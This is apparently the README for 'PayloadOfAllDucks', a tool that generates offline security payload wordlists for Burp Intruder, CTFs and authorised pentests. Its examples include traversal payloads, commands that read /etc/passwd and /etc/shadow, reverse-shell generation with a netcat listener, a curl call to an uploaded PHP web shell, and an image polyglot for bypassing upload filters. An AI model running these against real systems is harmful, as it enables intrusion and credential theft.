# PayloadOfAllDucks 

**POAD** is a context-aware, **offline** security-payload wordlist generator for
CTFs and **authorised** penetration testing. You pick a vulnerability category,
give it your own context (target file, template engine, DBMS, injection context,
…), and POAD generates a clean `payloadlist.txt` you can load straight into
**Burp Suite Intruder** as a Simple list. No manual find-and-replace across
hundreds of payloads.

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠉⠙⠲⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡞⠁⣀⣀⣀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣄⡀⠘⡆⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⠉⠉⠉⣹⡆⠀⠀⣿⣿⣿⣿⡇⠀⢀⣀⡿⠀⢹⠀⠀
⠀⢀⣀⣠⡬⠿⠿⠟⠓⠚⠛⠉⠉⠉⠙⢲⡈⠉⠉⠉⠉⠉⠉⠀⠀⠀⢸⡆⠀
⣞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀
⠉⠓⠶⠶⣶⠶⠶⠶⠖⠒⠒⠒⠒⠒⢦⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀
⠀⠀⠀⠀⠈⠓⠒⠶⠶⠶⠶⠶⡶⠶⠖⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡇⠀  P A Y L O A D   O F   A L L   D U C K S
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```

- **Offline and deterministic**: no network access, no telemetry, no AI. The same
  inputs always produce the same output.
- **Context-aware**: selecting *Jinja2 + detection* yields Jinja2 detection
  probes, not FreeMarker/ERB noise. Windows traversal doesn't mix in Linux-only
  paths.
- **Encoding-correct**: SSTI braces, literal `+`, quotes and backslashes are
  preserved byte-for-byte; traversal separator/double encodings are generated
  deliberately, not blindly.
- **Extensible**: add your own payloads as data (JSON packs), no Python edits.
- **Honest**: it never claims a payload bypasses a filter, and it reports
  techniques that can't be expressed as a single Burp Sniper marker.

> ⚠️ **Responsible use.** POAD only *generates* wordlists. It never contacts or
> attacks a target. You are responsible for only testing the output against
> systems you are explicitly authorised to test.

---

## Table of contents

- [Installation](#installation)
- [Quick start](#quick-start)
- [Interactive mode](#interactive-mode)
- [Commands](#commands)
- [Categories](#categories)
- [Encoding & Burp Intruder setup](#encoding--burp-intruder-setup)
- [Custom templates](#custom-templates)
- [Importing wordlists / PayloadsAllTheThings](#importing-wordlists--payloadsallthethings)
- [Presets](#presets)
- [Output formats](#output-formats)
- [Offline use](#offline-use)
- [Troubleshooting](#troubleshooting)
- [Limitations](#limitations)
- [Local demo lab](#local-demo-lab)
- [License & attribution](#license--attribution)

---

## Installation

Requires **Python 3.10+** (developed and tested on Ubuntu 22.04 and Windows).

```bash
git clone https://github.com/171k/PayloadOfAllDucks.git
cd PayloadOfAllDucks
python3 -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate
pip install .
poad
```

Optional nicer terminal output:

```bash
pip install ".[rich]"
```

You can also run without installing the entry point:

```bash
python3 -m poad
```

The core tool uses only the Python standard library; `rich` is optional and its
absence never breaks functionality.

---

## Quick start

```bash
# Path Traversal / LFI
poad generate lfi --file /flag/flag.txt --os linux --depth 8 --output payloadlist.txt

# SSTI detection probes for Jinja2
poad generate ssti --engine jinja2 --mode detection --output ssti.txt

# SQL injection, MySQL, string context
poad generate sqli --dbms mysql --context string --mode detection --output sqli.txt

# Reflected XSS in an HTML attribute (double-quoted)
poad generate xss --context html-attribute --quote double --output xss.txt
```

Preview without writing a file:

```bash
poad preview lfi --file /flag/flag.txt --depth 4
```

Sample LFI output (`/flag/flag.txt`, Linux, depth 8, encoding `all`):

```text
/flag/flag.txt
flag/flag.txt
../flag/flag.txt
../../flag/flag.txt
../../../../flag/flag.txt
..%2fflag%2fflag.txt
..%2f..%2fflag%2fflag.txt
..%252f..%252fflag%252fflag.txt
```

A generation summary (never fabricated, all counts are computed):

```text
PayloadOfAllDucks 🦆

Category: Path Traversal / LFI
Target file: /flag/flag.txt
OS: linux
Depth: 8
Families: direct, traversal, normalization

Templates loaded: 19
Variants generated: 76
Duplicates removed: 0
Final payloads: 76

Output: payloadlist.txt
Format: Burp Intruder Simple List

Completed successfully.
```

---

## Interactive mode

Run `poad` with no arguments for a numbered, keyboard-only menu:

```text
[1] Payload list      - generate wordlists for Burp Intruder
[2] Exploit script    - build a request harness for a payload list
[3] RCE               - reverse shells, web shells, image polyglots
[4] Browse Payload Library
[5] Presets
[6] Settings
[0] Exit
```

**Payload list** opens the vulnerability categories (LFI, SSTI, SQLi, XSS,
command injection, SSRF, XXE, custom). Each asks only for the inputs it needs,
offers defaults, validates your answers, previews the result, and confirms
before writing a file. Type `b` at a prompt to go back; `Ctrl+C` exits cleanly.
In a non-interactive shell POAD prints usage instead of blocking for input.

---

## Commands

| Command | Function |
|---|---|
| `poad` | Launch the interactive menu |
| `poad list` | List vulnerability categories |
| `poad list ssti` | Show a category's options (SSTI: engines) |
| `poad generate <CATEGORY> [opts]` | Generate a wordlist |
| `poad generate <CATEGORY> --help` | Category-specific options |
| `poad preview <CATEGORY> [opts]` | Preview payloads without writing a file |
| `poad templates list [category]` | List templates |
| `poad templates show <ID>` | Inspect a template + required variables |
| `poad templates validate <FILE>` | Validate a custom template pack |
| `poad presets list` | List saved presets |
| `poad presets run <NAME>` | Regenerate from a preset |
| `poad presets delete <NAME>` | Delete a preset |
| `poad import wordlist <FILE> --category <C>` | Import a plaintext wordlist |
| `poad import patt <DIR>` | Import a local PayloadsAllTheThings checkout |
| `poad rce revshell --lhost <IP> --lport <PORT>` | Reverse shell one-liners |
| `poad rce webshell --lang php\|jsp\|aspx` | Command web shell |
| `poad rce polyglot --image png\|gif` | PHP-in-image upload-bypass file |
| `poad exploit --url <URL-with-FUZZ> --wordlist <FILE>` | Build a request harness |
| `poad doctor` | Check installation & library integrity |
| `poad version` | Print version information |

Common `generate` options: `-o/--output`, `-f/--format`, `-e/--encoding`,
`--max-payloads`, `--sort`, `--force`, `--save-preset NAME`, `-q/--quiet`.
Save a preset while generating:

```bash
poad generate lfi --file /flag/flag.txt --os linux --depth 8 --encoding all --save-preset flag-lfi
poad presets run flag-lfi
```

Non-interactive mode never stops for input. A missing required option produces a
clear error and a non-zero exit code.

---

## Categories

### Path Traversal / LFI (`lfi`)
Inputs: `--file`, `--os {linux,windows}`, `--depth`, `--families`, `--prefix`,
`--suffix`, `--null-byte`, `--cross-platform`. Relative variants are derived from
the (possibly absolute) target by stripping the leading separator/drive before a
`../` prefix is applied, never blind concatenation. Families: `direct`,
`traversal`, `normalization`. Encodings: separator (`%2f`), mixed-case (`%2F`),
double (`%252f`).

### Server-Side Template Injection (`ssti`)
Inputs: `--engine`, `--mode {detection,identification,context,file-read}`,
`--file` (file-read only), `--marker`. Engines: Jinja2, Twig, FreeMarker,
Velocity, Smarty, ERB, EJS, Mako, Django, Thymeleaf, Spring EL, Pug. Detection
probes include documented expected results (e.g. `{{7*7}}` → `49`). SSTI payloads
are emitted **raw**, because encoding would break template syntax. Engines that cannot
read files via template syntax (e.g. Django) report that honestly instead of
fabricating payloads.

### SQL Injection (`sqli`)
Inputs: `--dbms {mysql,postgres,sqlite,mssql,generic}`,
`--context {string,numeric,search,unknown}`, `--mode {detection,boolean,error,union}`.
Non-destructive diagnostics only; dialects are not mixed (generic probes are
always included).

### Cross-Site Scripting (`xss`)
Inputs: `--context {html,html-attribute,js-string,url,svg,unknown}`,
`--quote {any,double,single,none}`, `--marker`. Benign `alert()` PoCs with a
proof marker. Reflection ≠ executable XSS (stated in the output notes).

### Command Injection (`cmdi`)
Inputs: `--os {linux,windows}`, `--shell {any,unix,unix-quoted,cmd,powershell}`,
`--command`. Harmless default command (`id` / `whoami`). No reverse shells,
persistence, destructive commands, or callbacks in the default library.

### Server-Side Request Forgery (`ssrf`)
Inputs: `--host` (required, your authorised target), `--scheme`, `--path`,
`--port`. Builds URL-parser and encoding variants from **your** host only. POAD
ships no default targets and never generates metadata/internal-range endpoints.

### XML External Entity (`xxe`)
Inputs: `--mode {detection,file-read}`, `--file`, `--marker`. Emits **whole XML
documents** (single-line, so still valid wordlist entries). You replace the full
request body with one of these, rather than placing it in a single Sniper marker.

---

## Exploit script mode

`poad exploit` writes a standalone Python 3 script (standard library only),
tailored to one vulnerability, built around the single payload that worked in
Burp Intruder (Sniper). POAD asks which bug it is first, then bakes in your
confirmed payload. POAD does not send any requests; you run the script against a
single authorised target.

```bash
# You found this LFI payload worked in Sniper. Make a reusable script for it:
poad exploit --vuln lfi --payload "../../../../etc/passwd" --url "http://TARGET/?page=FUZZ"
python3 exploit_lfi.py                     # fires your confirmed payload
python3 exploit_lfi.py -p "../../../../etc/shadow"   # read another file
python3 exploit_lfi.py --decode-base64     # for php://filter output
```

`--vuln` sets smart defaults for the URL, method, and body (e.g. XXE becomes a
POST with the XML in the body). `FUZZ` marks where the payload goes. The script
sends your payload, prints the response, and adds per-vuln helpers:

| Vuln | Helper |
|---|---|
| `lfi` | `--decode-base64` for php://filter output |
| `ssti` | swap the expression with `-p/--payload` |
| `xss` | reports whether the payload is reflected unescaped |
| `cmdi` | swap the command inside `-p/--payload` |
| `sqli` | prints length/body to compare true vs false |
| `ssrf` | prints what the server fetched |
| `xxe` | sends the full XML document as the POST body |

It can still sweep a list with `--wordlist`, but defaults to your one confirmed
payload. Other options: `-X/--method`, `-d/--data` (body with `FUZZ`),
`-H/--header`, `--delay`, `--timeout`, `--urlencode`.

## RCE mode

RCE artifacts are **opt-in** and separate from the payload-generator library
(which stays shell-free). POAD writes the artifact and prints the commands you
run yourself. It never opens a listener, delivers, or executes anything, and it
contains no C2, persistence, or destructive behaviour.

**Reverse shells** (`poad rce revshell`) produce one-liners with your
`LHOST`/`LPORT` filled in, for bash, nc, python, perl, php, ruby, socat,
PowerShell, and `nc.exe`:

```bash
poad rce revshell --lhost 10.10.14.5 --lport 4444 --os linux -o revshells.txt
# POAD also prints the catcher:
#   nc -lvnp 4444        (on Pwnbox set LHOST from: ip -4 addr show tun0)
```

**Web shells** (`poad rce webshell`) write a readable PHP, JSP, or ASPX command
shell:

```bash
poad rce webshell --lang php --param cmd -o shell.php
# then:  curl 'http://TARGET/uploads/shell.php?cmd=id'
```

**Image polyglots** (`poad rce polyglot`) write a file that is a valid PNG/GIF
(passes `getimagesize()`) and also contains PHP, for upload-filter bypass. It
only executes if the server ends up treating it as PHP (permissive double
extension, or an LFI that includes the upload):

```bash
poad rce polyglot --image png --param cmd -o shell.php.png
```

> These are standard CTF/pentest building blocks. Use them only against systems
> you are explicitly authorised to test.

---

## Encoding & Burp Intruder setup

Burp Intruder applies its own payload processing and final URL-encoding. POAD
does **not** assume your bytes are sent unchanged, so configure Burp to match.

1. **Proxy** a request, send to **Intruder**.
2. Clear auto-markers, wrap your insertion point with a single **Sniper** marker.
3. **Payloads → Payload type: Simple list → Load → `payloadlist.txt`**.
4. **Payload encoding**: under *Payloads → Payload encoding*, review
   "URL-encode these characters".

Guidance by payload kind:

- **Raw payloads (default)**: e.g. SSTI, SQLi, XSS. Let Burp apply its normal
  URL-encoding for the request. Do **not** double-encode.
- **Pre-encoded payloads**: e.g. LFI `..%2f..%2f` or double-encoded `%252f`.
  **Disable** Burp's "URL-encode these characters" (uncheck `%`) so Burp does not
  re-encode your `%` into `%25`. Otherwise `..%2f` becomes `..%252f`
  unintentionally.
- **Mixed lists**: if a list mixes raw and pre-encoded payloads, pick one
  encoding strategy and review every entry, or generate two lists.

POAD prints a reminder whenever it emits encoded payloads. The `settings`
`burp_mode` (`raw` / `pre-encoded` / `mixed`) records your preferred default.

POAD preserves: intentional percent-encodings, literal `+` vs space, backslashes,
quotes, and SSTI braces. It never URL-decodes your input and re-encodes it.

---

## Custom templates

You can add payloads as **data**, without editing Python. A pack is a JSON file:

```json
{
  "pack": "my-lfi-pack",
  "category": "lfi",
  "source": "custom",
  "templates": [
    {
      "id": "custom-proc-environ",
      "name": "Read /proc/self/environ",
      "category": "lfi",
      "template": "/proc/self/environ",
      "tags": ["custom", "linux"]
    },
    {
      "id": "custom-webroot",
      "name": "Webroot-relative file",
      "category": "lfi",
      "template": "/var/www/<<POAD_FILE>>",
      "required": ["file"]
    }
  ]
}
```

Placeholders use `<<POAD_NAME>>` (not `{NAME}`) so literal braces in payloads are
safe. Substitution is literal string replacement, with **no `eval`, no code
execution**. Validate and install:

```bash
poad templates validate my-lfi-pack.json
# Place it under your user templates dir to load it automatically:
#   Linux:   ~/.config/poad/templates/lfi/my-lfi-pack.json
#   Windows: %APPDATA%\poad\templates\lfi\my-lfi-pack.json
```

Invalid user packs are skipped with a warning at startup (shown by `poad doctor`),
never crashing the tool.

---

## Importing wordlists / PayloadsAllTheThings

POAD treats imported entries as **data**, never executable code, and never runs
or tests them.

```bash
# Import any plaintext wordlist into a category
poad import wordlist ./custom.txt --category lfi

# Import from a LOCAL PayloadsAllTheThings checkout (no GitHub scraping)
poad import patt ./PayloadsAllTheThings
```

The PayloadsAllTheThings importer reads reliable `.txt` Intruder lists, maps them
to categories by folder name, de-duplicates, **skips** anything it can't reliably
categorise, and records MIT attribution on the generated packs. Installing or
downloading PayloadsAllTheThings is **not** required to use POAD. The builtin
library stands on its own.

> [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) is
> MIT-licensed. Preserve its copyright/attribution notices when redistributing
> imported content.

---

## Presets

Presets store **configuration only** (never generated payloads, secrets, or
credentials) as human-readable JSON with a schema version. Corrupted presets are
reported, not silently used.

```bash
poad generate lfi --file /flag/flag.txt --os linux --depth 8 --save-preset flag-lfi
poad presets list
poad presets run flag-lfi -o payloadlist.txt
```

---

## Output formats

The default `txt` export is deliberately clean and Burp-ready: UTF-8, one payload
per line, no numbering/comments/headings/banner, no duplicates, no trailing
whitespace, deterministic order, no embedded CR/LF. Additional formats carry
metadata for reporting:

```bash
poad generate lfi --file /flag/flag.txt -f json -o out.json
poad generate lfi --file /flag/flag.txt -f csv  -o out.csv
poad generate lfi --file /flag/flag.txt -f md   -o report.md
```

---

## Offline use

POAD performs **no** network access during generation. Verify with your firewall
or `strace`/Process Monitor. There is no telemetry and no AI. Everything (builtin
templates, presets, user packs) lives on your machine.

---

## Troubleshooting

- **`poad: command not found`**: activate your venv, or run `python3 -m poad`.
- **Payloads look double-encoded in Burp**: Burp is re-encoding your `%`. Disable
  "URL-encode these characters" for pre-encoded lists (see
  [Encoding](#encoding--burp-intruder-setup)).
- **"Output file already exists"**: POAD refuses to overwrite by default; pass
  `--force` or choose another `--output`.
- **No duck/emoji in the banner**: your terminal lacks UTF-8; POAD falls back to
  ASCII automatically. Set `unicode_banner=false` in settings to force ASCII.
- **A custom pack won't load**: run `poad doctor`; it lists invalid packs and the
  reason. Validate with `poad templates validate <file>`.
- **Install sanity check**: `poad doctor` verifies the packaged template library
  and smoke-tests every module.

---

## Limitations

- POAD generates payloads; it does **not** confirm vulnerabilities. A payload
  appearing in a response is not proof of exploitation.
- No preset or "mode" guarantees discovery of a vulnerability.
- Some techniques (blind/OOB SSTI, OOB XXE, reverse shells) need infrastructure
  POAD intentionally does not generate.
- File-read SSTI and some SQLi payloads are environment/version dependent and are
  marked as such.
- XXE payloads are whole documents; they are not single-value Sniper markers.

---

## Local demo lab

See [`examples/`](examples/) for a tiny, deliberately vulnerable **local**
LFI server (standard library only) and a walkthrough. It binds to `127.0.0.1`
and is for education/authorised practice on your own machine only.

```bash
python3 examples/vuln_lab.py            # serves http://127.0.0.1:8099
poad generate lfi --file examples/secret_flag.txt --depth 4 -o payloadlist.txt
# then test the list against the local lab with Burp or curl (see examples/README.md)
```

---

## License & attribution

POAD is released under the [MIT License](LICENSE). Builtin templates are original,
curated content. Imported third-party content retains its own license and
attribution (e.g. PayloadsAllTheThings, MIT).

**This project is for authorised security testing, CTFs, and education only.**
It was developed as a general-purpose lab utility. It is not claimed to be
approved for any specific competition, and it makes no AI calls and depends on no
external hosting.
